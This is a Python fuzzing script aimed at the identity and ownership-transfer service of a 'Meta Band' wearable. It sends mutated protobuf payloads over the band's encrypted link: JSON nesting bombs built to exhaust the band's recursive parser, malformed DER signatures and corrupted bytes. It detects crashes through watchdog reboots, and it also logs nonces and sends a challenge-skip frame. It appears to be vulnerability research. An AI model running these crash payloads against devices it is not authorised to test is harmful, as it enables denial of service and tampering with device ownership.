#!/usr/bin/env python3
"""Identity-service fuzzing campaign against the band (device in the loop).

Mutates real captured payloads (StartChangeOwner receipt, FinishChangeOwner
receipt, EnableTrust) and sends them to the band's identity service over the
normal encrypted transport. After each case an identity-read control verifies
the band is alive; a dead control plus a rotated advertisement identifier
marks a confirmed crash (watchdog reboot) and saves the payload to the corpus.

No Meta contact, no phone, no reset. Crashes self-heal via the band watchdog.
Pass a raw payload export with --seed-bin (or --seed with a raw payload file);
the capture-decode helpers behind the original campaign's --seed log path are
not part of this repo.
"""
import argparse
import asyncio
import base64
import json
import os
import random
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import mac_band_probe as probe
from analyze_capture import protobuf_fields
from band_access import band_connection
from extract_telemetry import DataXStream
from scan_band import scan_bands

MAX_PAYLOAD = 3900  # one encrypted record: <=256 blocks of 16B
CORPUS = HERE.parent / 'captures' / 'fuzz-corpus'


def load_seed(path, payload_type):
    """Load a raw payload file. Capture logs need extraction helpers this
    repo does not ship; export the raw payload bytes and use --seed-bin."""
    data = Path(path).read_bytes()
    if data.startswith(b'{'):
        raise SystemExit('capture-log seeds are not supported here; export the '
                         'raw payload bytes and pass them with --seed-bin')
    if payload_type is None:
        table = {'startchangeowner': 0x2002, 'finishchangeowner': 0x2004,
                 'enabletrust': 0x1000}
        payload_type = table.get(Path(path).stem, 0x2002)
    return {payload_type: data}


def wrap_protobuf(payload_type, body):
    return bytes([payload_type]) + body


def mut_nesting_bomb(seed, rng):
    """Inject a deeply nested JSON value inside receipt.additional_data: the
    band parses that field as JSON a second time, so recursion depth is
    attacker-controlled. Protobuf field 1 = receipt JSON, field 2+ unchanged."""
    import json as _json
    fields = list(protobuf_fields(seed))
    receipt_bytes = None
    for num, wire, val in fields:
        if num == 2 and isinstance(val, (bytes, bytearray)):
            receipt_bytes = bytes(val)
    if not receipt_bytes:
        return None
    try:
        receipt = _json.loads(receipt_bytes.decode('utf-8'))
    except Exception:
        return None
    depth = rng.choice([64, 128, 256, 400])
    bomb = ('{"a":' * depth) + '1' + ('}' * depth)
    # minimal receipt: receipt_type + additional_data = the bomb itself, so the
    # band's second JSON parse recurses at attacker depth with no other confounds
    receipt = {'receipt_type': 'ServerPendingOwnershipReceipt',
               'additional_data': bomb}
    new_receipt = _json.dumps(receipt).encode()
    out = bytearray()
    for num, wire, val in fields:
        if num == 2 and isinstance(val, (bytes, bytearray)):
            val = new_receipt
        # rebuild wire: tag byte(s) + len varint + value (wire type 2 only)
        tag = (num << 3) | wire
        out.append(tag)
        vlen = len(val)
        while True:
            b = vlen & 0x7F
            vlen >>= 7
            out.append(b | (0x80 if vlen else 0))
            if not vlen:
                break
        out += val
    payload = bytes(out)
    return payload if len(payload) <= MAX_PAYLOAD else None


def mut_decoupled(seed, rng):
    """Depth/size decoupling probe. Builds a MINIMAL receipt whose
    additional_data is a structural JSON nesting bomb
    ('{"a":' * depth + '1' + '}' * depth). rng.decouple_depth sets the bomb
    depth; rng.decouple_pad pads the receipt top level with key 'zp' =
    'A' * pad. decouple drivers set both attributes so depth and total size
    vary independently (family A: fixed depth, rising pad; family B: rising
    depth, no pad)."""
    import json as _json
    depth = getattr(rng, 'decouple_depth', 300)
    pad = getattr(rng, 'decouple_pad', 0)
    fields = list(protobuf_fields(seed))
    bomb = ('{"a":' * depth) + '1' + ('}' * depth)
    receipt = {'receipt_type': 'ServerPendingOwnershipReceipt',
               'additional_data': bomb}
    if pad:
        receipt['zp'] = 'A' * pad
    new_receipt = _json.dumps(receipt, separators=(',', ':')).encode()
    out = bytearray()
    for num, wire, val in fields:
        if num == 2 and isinstance(val, (bytes, bytearray)):
            val = new_receipt
        tag = (num << 3) | wire
        out.append(tag)
        vlen = len(val)
        while True:
            b = vlen & 0x7F
            vlen >>= 7
            out.append(b | (0x80 if vlen else 0))
            if not vlen:
                break
        out += val
    payload = bytes(out)
    return payload if len(payload) <= MAX_PAYLOAD else None


def mut_long_string(seed, rng):
    size = rng.choice([512, 1024, 2048, 3500])
    filler = base64.b64encode(os.urandom(size)).decode()[:size]
    try:
        text = seed.decode('utf-8', 'strict')
    except UnicodeDecodeError:
        return None
    import re
    candidates = list(re.finditer(r'"([A-Za-z0-9+/]{20,}={0,2})"', text))
    if not candidates:
        return None
    m = rng.choice(candidates)
    new = text[:m.start(1)] + filler[:size] + text[m.end(1):]
    return new.encode() if len(new) <= MAX_PAYLOAD else None


def mut_der_edge(seed, rng):
    """Swap signature bytes with DER edge cases: 0-length, 0xFF length, trailing junk."""
    out = bytearray(seed)
    idx = [i for i in range(len(out) - 4) if out[i] == 0x30 and out[i + 1] in (0x42, 0x44, 0x46, 0x71)]
    if not idx:
        return None
    i = rng.choice(idx)
    mode = rng.choice([b'\x30\x00', b'\x30\xff\xff\xff', b'\x30\x84\xff\xff\xff\xff', b'\x30\x01\x00'])
    out[i:i + 4] = mode
    return bytes(out)


def mut_truncate(seed, rng):
    cut = rng.randrange(1, max(2, len(seed) - 1))
    return seed[:cut]


def mut_protobuf_edges(seed, rng):
    out = bytearray(seed)
    for _ in range(rng.randint(1, 6)):
        i = rng.randrange(len(out))
        out[i] = rng.choice([0xFF, 0x7F, 0x00, 0x0A, 0x12])
    return bytes(out)


def mut_random(seed, rng):
    out = bytearray(seed)
    for _ in range(rng.randint(1, 32)):
        out[rng.randrange(len(out))] = rng.randrange(256)
    return bytes(out)


MUTATORS = [mut_nesting_bomb, mut_long_string, mut_der_edge, mut_truncate,
            mut_protobuf_edges, mut_random]


def generate_cases(seed, count, rng, mode):
    cases = []
    if mode == 'depthladder':
        ladder = [64, 100, 150, 200, 255, 300, 350, 400]
        cases = []
        for d in ladder:
            cases.append(mut_nesting_bomb(seed, random.Random(d)))
        return [c for c in cases if c]
    if mode == 'nesting':
        pool = [mut_nesting_bomb]
    elif mode == 'random':
        pool = [mut_random]
    else:
        pool = MUTATORS
    guard = 0
    while len(cases) < count and guard < count * 20:
        guard += 1
        m = rng.choice(pool)
        payload = m(seed, rng)
        if payload and len(payload) <= MAX_PAYLOAD:
            cases.append(payload)
    return cases


class IdentityFuzzer(probe.BandHandshake):
    def __init__(self, emit, cases, results, **kwargs):
        self.frames = DataXStream()
        self.types = {}
        self.cases = cases
        self.results = results
        self.stage = 0
        self.started = None
        self.sent_end = False
        self.control_pending = None
        self.nonce_saved = False
        kwargs['end_link_setup'] = False
        super().__init__(self.observe, **kwargs)

    def encrypt_frame(self, frame):
        encrypted = super().encrypt_frame(frame)
        if frame == probe.typed_frame(0x8002, [0x81000024, 0x02003000]):
            # identity read first (control), then begin the case sequence
            encrypted += super().encrypt_frame(probe.typed_frame(0x800a, [0x81000024, 0x02003000]))
            self.started = time.monotonic()
        return encrypted

    def observe(self, event, **data):
        if event == 'authenticated_packet':
            for channel, words, payload, observed in self.frames.feed(bytes.fromhex(data['plaintext']), None):
                if words:
                    self.types[channel] = words[-1]
                if channel == 0xc:
                    try:
                        self.record_nonce(bytes(payload))
                    except Exception:
                        pass
                kind = self.types.get(channel)
                if kind is not None and channel in (0x2, 0xa, 0xb):
                    self.results.setdefault('frames', []).append(
                        (channel, hex(kind), len(payload)))
                    if channel == self.control_channel and kind == 0x02003001:
                        self.control_ok = True

    control_channel = 0xa

    def send_case(self, payload):
        self.config_outgoing.extend(self.encrypt_frame(probe.typed_frame(
            0x800b, [0x81000024, 0x02002002], payload)))
        self.control_channel = 0xb

    def send_control(self):
        self.config_outgoing.extend(self.encrypt_frame(probe.typed_frame(
            self.control_channel, [0x81000024, 0x02003000])))
        self.control_ok = False

    def send_skip_challenge(self):
        self.config_outgoing.extend(self.encrypt_frame(probe.typed_frame(
            0x800c, [0x81000024, 0x02002000])))

    def record_nonce(self, payload):
        if self.nonce_saved or len(payload) != 18 or payload[:2] != b'\x0a\x10':
            return
        self.nonce_saved = True
        path = CORPUS / 'nonces.txt'
        path.parent.mkdir(parents=True, exist_ok=True)
        with path.open('a') as handle:
            handle.write('%s %s\n' % (payload[2:].hex(),
                                      datetime.now(timezone.utc).isoformat()))

    def tick(self):
        super().tick()
        if self.started is None:
            return
        elapsed = time.monotonic() - self.started
        # t=1.5: control identity read; t=2.5: case 1; then per case: control, case
        if self.stage == 0 and elapsed >= 1.5:
            self.stage = 1
            self.send_control()
            try:
                self.send_skip_challenge()
            except Exception:
                pass
        schedule = []
        # cases are sent with 1.0s spacing; a control precedes each
        for i in range(len(self.cases) + 1):
            schedule.append(2.5 + i * 1.6)
        for i, t in enumerate(schedule):
            if self.stage == 1 + i and elapsed >= t:
                self.stage = 2 + i
                if i < len(self.cases):
                    self.send_case(self.cases[i])
                else:
                    self.send_control()


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--seed', help='raw payload file; the filename stem picks '
                                       'the type (startchangeowner, finishchangeowner, enabletrust)')
    parser.add_argument('--seed-bin', dest='seed_bin',
                        help='raw payload file, typed by --type (skips capture extraction)')
    parser.add_argument('--type', choices=['2002', '2004', '1000'], default='2002')
    parser.add_argument('--name', default='Meta Band',
                        help='band advertisement name prefix to target')
    parser.add_argument('--cases', type=int, default=10, help='cases per connection')
    parser.add_argument('--mode', choices=['all', 'nesting', 'random', 'depthladder'], default='all')
    parser.add_argument('--rounds', type=int, default=1)
    parser.add_argument('--seconds', type=int, default=60)
    parser.add_argument('--seed-offset', type=int, default=0, help='rng seed offset')
    args = parser.parse_args()
    if not args.seed and not args.seed_bin:
        parser.error('one of --seed or --seed-bin is required')

    type_table = {'2002': 0x2002, '2004': 0x2004, '1000': 0x1000}
    if args.seed_bin:
        seeds = {type_table[args.type]: Path(args.seed_bin).read_bytes()}
    else:
        seeds = load_seed(args.seed, None)
    base = seeds[type_table[args.type]]
    print(f'seed payload: {len(base)} bytes (type 0x{args.type})', flush=True)

    CORPUS.mkdir(parents=True, exist_ok=True)
    rng = random.Random(1337 + args.seed_offset)

    for round_no in range(args.rounds):
        cases = generate_cases(base, args.cases, rng, args.mode)
        print(f'round {round_no}: {len(cases)} cases generated', flush=True)
        bands = asyncio.run(scan_bands())
        matches = [b for b in bands if b['name'].startswith(args.name)]
        if len(matches) != 1:
            print(json.dumps({'event': 'no_band', 'scan': bands}), flush=True)
            return
        identifier = matches[0]['address']

        results = {'frames': []}
        capture = CORPUS / f"run-{datetime.now(timezone.utc).strftime('%H%M%S')}-{round_no}.jsonl"

        def emit(event, **data):
            record = {'event': event, 'timestamp': datetime.now(timezone.utc).isoformat(), **data}
            existing = capture.read_text() if capture.exists() else ''
            capture.write_text(existing + json.dumps(record) + '\n')

        class Runner(IdentityFuzzer):
            def __init__(self, emit, **kwargs):
                super().__init__(emit, cases, results, **kwargs)

        import importlib
        importlib.reload(probe)
        original = probe.BandHandshake
        probe.BandHandshake = Runner
        source = __import__('inspect').getsource(probe.run_probe)
        anchor = '            delegate.handshake.tick()\n'
        source = source.replace(anchor, anchor + '            delegate.outgoing.extend(delegate.handshake.feed(b""))\n')
        exec(compile(source, 'driver', 'exec'), probe.__dict__)
        run_args = argparse.Namespace(identifier=identifier, seconds=args.seconds,
                                      query_device_info=False, end_link_setup=False,
                                      stream_control=None, query_config=False,
                                      hand=None, dial_settings=None)
        try:
            with band_connection():
                probe.run_probe(run_args, emit)
        except Exception as error:
            print('probe error:', error, flush=True)
        probe.BandHandshake = original

        case_results = [k for c, k, l in results['frames'] if c == 0xb]
        answered = len(case_results)
        # kinds is an ordered list: index i = reply to case i (append order)
        print(json.dumps({'round': round_no, 'answered': answered,
                          'expected': len(cases), 'kinds': case_results}), flush=True)
        if answered < len(cases):
            print('CONTROL FAILURE DETECTED - band likely rebooted; '
                  'round aborted early; check identifier on next scan', flush=True)
            # save all cases for triage
            for i, c in enumerate(cases):
                (CORPUS / f'round{round_no}-case{i:03d}.bin').write_bytes(c)
        else:
            print('band survived round', flush=True)


if __name__ == '__main__':
    main()
